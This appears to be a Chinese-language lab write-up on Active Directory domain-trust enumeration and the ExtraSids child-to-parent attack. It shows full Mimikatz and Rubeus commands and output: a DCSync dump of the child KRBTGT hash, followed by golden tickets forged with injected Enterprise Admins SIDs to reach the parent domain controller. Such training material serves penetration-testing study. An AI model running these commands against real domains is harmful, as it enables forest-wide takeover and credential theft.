class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">08</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br></pre></td></tr></table></figure><h3 id="netdom-query"><a href="#netdom-query" class="headerlink" title="netdom query"></a>netdom query</h3><h4 id="Domain-Trust"><a href="#Domain-Trust" class="headerlink" title="Domain Trust"></a>Domain Trust</h4><p>可以用来获取域信任的另一个工具是<code>netdom</code>。Windows中的命令行工具<code>netdom query</code>的子命令<code>netdom</code>可以检索有关域的信息，包括工作站、服务器和域信任的列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; netdom query /domain:inlanefreight.local trust</span><br><span class="line">Direction Trusted\Trusting domain                         Trust type</span><br><span class="line">========= =======================                         ==========</span><br><span class="line"></span><br><span class="line">&lt;-&gt;       LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">Direct</span><br><span class="line"> Not found</span><br><span class="line"></span><br><span class="line">&lt;-&gt;       FREIGHTLOGISTICS.LOCAL</span><br><span class="line">Direct</span><br><span class="line"> Not found</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><h4 id="Domain-Controllers"><a href="#Domain-Controllers" class="headerlink" title="Domain Controllers"></a>Domain Controllers</h4><p>查询域控制器</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netdom</span> <span class="title">query</span> /<span class="title">domain:inlanefreight</span>.<span class="title">local</span> <span class="title">dc</span></span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">domain</span> <span class="title">controllers</span> <span class="title">with</span> <span class="title">accounts</span> <span class="title">in</span> <span class="title">the</span> <span class="title">domain</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h4 id="Workstations-and-Servers"><a href="#Workstations-and-Servers" class="headerlink" title="Workstations and Servers"></a>Workstations and Servers</h4><p>查询工作站和服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; netdom query /domain:inlanefreight.local workstation</span><br><span class="line">List of workstations with accounts in the domain:</span><br><span class="line"></span><br><span class="line">ACADEMY-EA-MS01</span><br><span class="line">ACADEMY-EA-MX01      ( Workstation or Server )</span><br><span class="line"></span><br><span class="line">SQL01      ( Workstation or Server )</span><br><span class="line">ILF-XRG      ( Workstation or Server )</span><br><span class="line">MAINLON      ( Workstation or Server )</span><br><span class="line">CISERVER      ( Workstation or Server )</span><br><span class="line">INDEX-DEV-LON      ( Workstation or Server )</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>还可以使用 BloodHound 通过<code>Map Domain Trusts</code>预先构建的查询来可视化这些信任关系。在这里可以轻松地看到存在两个双向信任。</p><h3 id="BloodHound-3"><a href="#BloodHound-3" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>可视化信任关系</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729251082202.png" alt="图像"></p><hr><h1 id="Attacking-Domain-Trusts-Child-Parent-Trusts"><a href="#Attacking-Domain-Trusts-Child-Parent-Trusts" class="headerlink" title="Attacking Domain Trusts - Child -&gt; Parent Trusts"></a>Attacking Domain Trusts - Child -&gt; Parent Trusts</h1><h2 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory">SID History</a>属性用于迁移场景，如果一个域中的用户迁移到另一个域，则会在第二个域中创建一个新账户，原用户的 SID 会添加到新用户的 SID 历史属性中，确保用户仍可访问原域中的资源。</p><p>SID 历史记录旨在跨域工作，但可以在同一个域中工作。使用 Mimikatz，攻击者可以执行 SID 历史记录注入，并将管理员帐户添加到他们控制的帐户的 SID 历史记录属性中。使用此帐户登录时，与该帐户关联的所有 SID 都会添加到用户的令牌中。</p><p>此令牌用于确定帐户可以访问哪些资源。如果将域管理员帐户的 SID 添加到此帐户的 SID 历史记录属性中，则此帐户将能够执行 DCSync 并创建<a href="https://attack.mitre.org/techniques/T1558/001/">黄金票证</a>或 Kerberos 票证授予票证 (TGT)，这将允许以所选域中的任何帐户的身份进行身份验证，以实现进一步的持久性。</p><h2 id="ExtraSids-Attack-Windows"><a href="#ExtraSids-Attack-Windows" class="headerlink" title="ExtraSids Attack - Windows"></a>ExtraSids Attack - Windows</h2><p>一旦子域被攻陷，此攻击便可攻陷父域。在同一个 AD 林中，由于缺乏<a href="https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html">SID 筛选保护， </a><a href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory">SID History</a>属性受到尊重。SID 筛选是一种保护措施，用于过滤来自跨信任的另一个林中的域的身份验证请求。因此，如果子域中的用户将其 SID History 设置为（仅存在于父域中），则他们被视为此组的成员，从而允许对整个林进行管理访问。换句话说，正在从被攻陷的子域创建黄金票证以攻陷父域。在这种情况下，利用<code>SIDHistory</code>授予帐户（或不存在的帐户）企业管理员权限，方法是修改<code>Enterprise Admins group</code>此属性以包含企业管理员组的 SID，这将使无需实际成为该组的一部分即可完全访问父域。</p><p>为了在入侵子域后执行此攻击，需要以下内容：</p><ul><li><p>子域的 KRBTGT 哈希</p></li><li><p>子域的 SID</p></li><li><p>子域中的目标用户的名称（不需要存在！）</p></li><li><p>子域的 FQDN。</p></li><li><p>根域的企业管理员组的 SID</p></li></ul><p>收集到这些数据后，就可以使用 Mimikatz 进行攻击。</p><p><a href="https://adsecurity.org/?p=483">KRBTGT</a>帐户是 Active Directory 中密钥分发中心 (KDC) 的服务帐户。帐户 KRB（Kerberos）TGT（Ticket Granting Ticket）用于加密&#x2F;签署给定域内授予的所有 Kerberos 票证。域控制器使用该帐户的密码来解密和验证 Kerberos 票证。KRBTGT 帐户可用于创建 Kerberos TGT 票证，该票证可用于请求域中任何主机上任何服务的 TGS 票证，这也称为<code>Golden Ticket attack</code>，是 Active Directory 环境中攻击者众所周知的持久性机制。使黄金票证失效的唯一方法是更改 KRBTGT 帐户的密码，这应该定期进行，并且在渗透测试评估达到整个域入侵后一定要进行。</p><h3 id="Collect"><a href="#Collect" class="headerlink" title="Collect"></a>Collect</h3><h4 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>由于已经破坏了子域，可以以域管理员或类似身份登录并执行 DCSync 攻击以获取 KRBTGT 帐户的 NT Hash。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  mimikatz <span class="comment"># lsadump::dcsync /user:LOGISTICS\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">33</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">69</span>df324191d4a80f0ed100c10f20561e</span><br></pre></td></tr></table></figure><h4 id="PowerView-5"><a href="#PowerView-5" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView Get-DomainSID 函数来获取子域的 SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure><p>获取父域中 Enterprise Admins 组的 SID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> INLANEFREIGHT.LOCAL <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid                                    </span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span>                                    </span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure><p>也可以使用<a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet 执行此操作，命令如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> <span class="literal">-Server</span> <span class="string">&quot;INLANEFREIGHT.LOCAL&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>至此，收集了以下数据点：</p><ul><li>子域的 KRBTGT 哈希：<code>9d765b482771505cbe97411065964d5f</code></li><li>子域的 SID：<code>S-1-5-21-2806153819-209893948-922872689</code></li><li>子域中的目标用户的名称（创建黄金票证时不需要存在！）：选择一个虚假用户：<code>hacker</code></li><li>子域的 FQDN：<code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li><li>根域的企业管理员组的 SID:<code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li></ul><h4 id="Mimikatz-3"><a href="#Mimikatz-3" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span></span><br><span class="line">User      : hacker</span><br><span class="line">Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">SID       : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">User Id   : <span class="number">500</span></span><br><span class="line">Groups Id : *<span class="number">513</span> <span class="number">512</span> <span class="number">520</span> <span class="number">518</span> <span class="number">519</span></span><br><span class="line">Extra SIDs: S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> ;</span><br><span class="line">ServiceKey: <span class="number">9</span>d765b482771505cbe97411065964d5f - rc4_hmac_nt</span><br><span class="line">Lifetime  : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM ; <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">7</span>:<span class="number">59</span>:<span class="number">50</span> PM</span><br><span class="line">-&gt; Ticket : ** Pass The Ticket **</span><br><span class="line"></span><br><span class="line"> * PAC generated</span><br><span class="line"> * PAC signed</span><br><span class="line"> * EncTicketPart generated</span><br><span class="line"> * EncTicketPart encrypted</span><br><span class="line"> * KrbCred generated</span><br><span class="line"></span><br><span class="line">Golden ticket <span class="keyword">for</span> <span class="string">&#x27;hacker @ LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> successfully submitted <span class="keyword">for</span> current session</span><br></pre></td></tr></table></figure><p>使用 klist 可以确认不存在的黑客用户的 Kerberos 票证驻留在内存中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>xf6462</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Renew Time: <span class="number">3</span>/<span class="number">25</span>/<span class="number">2032</span> <span class="number">19</span>:<span class="number">59</span>:<span class="number">50</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br></pre></td></tr></table></figure><p>列出域控制器的整个 C: 驱动器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span> \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span> has no label.</span><br><span class="line"> Volume Serial Number is B8B3<span class="literal">-0D72</span></span><br><span class="line"></span><br><span class="line"> Directory of \\academy<span class="literal">-ea-dc01</span>.inlanefreight.local\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">12</span>:<span class="number">19</span> AM    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">01</span>:<span class="number">50</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">09</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">02</span>:<span class="number">06</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">11</span>/<span class="number">19</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">17</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Shares</span><br><span class="line"><span class="number">10</span>/<span class="number">06</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">31</span> AM    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">03</span>/<span class="number">21</span>/<span class="number">2022</span>  <span class="number">12</span>:<span class="number">18</span> PM    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">               <span class="number">6</span> <span class="built_in">Dir</span>(s)  <span class="number">18</span>,<span class="number">080</span>,<span class="number">178</span>,<span class="number">176</span> bytes free</span><br></pre></td></tr></table></figure><h4 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h4><p><code>/rc4</code> KRBTGT 帐户的 NT Hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:<span class="number">9</span>d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S<span class="literal">-1-5-21-2806153819-209893948-922872689</span>  /sids:S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> /user:hacker /ptt</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">520</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">519</span>,<span class="number">518</span></span><br><span class="line">[*] ExtraSIDs      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br><span class="line">[*] ServiceKey     : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] KDCKey         : <span class="number">9</span>D765B482771505CBE97411065964D5F</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;hacker@LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">3</span>/<span class="number">29</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">06</span>:<span class="number">41</span> PM</span><br><span class="line">[*] RenewTill      : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">06</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG</span><br><span class="line">      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M</span><br><span class="line">      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH</span><br><span class="line">      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++<span class="number">2</span>iX94uRrwa/S</span><br><span class="line">      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy</span><br><span class="line">      k7+<span class="number">0</span>EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc</span><br><span class="line">      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm</span><br><span class="line">      <span class="number">9</span>f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY</span><br><span class="line">      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz</span><br><span class="line">      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/<span class="number">4</span>GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT</span><br><span class="line">      <span class="number">3</span>dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+<span class="built_in">H</span></span><br><span class="line">      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG</span><br><span class="line">      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo</span><br><span class="line">      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/<span class="number">3</span>l5j0KxgjdZbwoFbC7p76IPC3B</span><br><span class="line">      